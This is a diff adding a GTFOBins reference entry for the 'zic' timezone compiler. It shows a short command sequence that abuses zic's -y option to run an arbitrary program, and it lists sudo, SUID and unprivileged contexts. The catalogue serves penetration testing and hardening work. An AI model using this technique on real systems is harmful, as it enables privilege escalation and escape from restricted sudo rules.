@@ -1,0 +1,20 @@
+<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/zic -->
+---
+functions:
+  command:
+  - code: |-
+      echo 'Rule Jordan 0 1 xxx Jan lastSun 2 1:00d -' >/path/to/temp-file
+      echo 'Zone Test 2:00 Jordan CE%sT' >>/path/to/temp-file
+      zic -d . -y /path/to/command /path/to/temp-file
+    comment: |-
+      This executes the command twice:
+
+      - `/path/to/command 0 xxx`
+      - `/path/to/command 1 xxx`
+
+      Additionally the `Test` file is created.
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+...
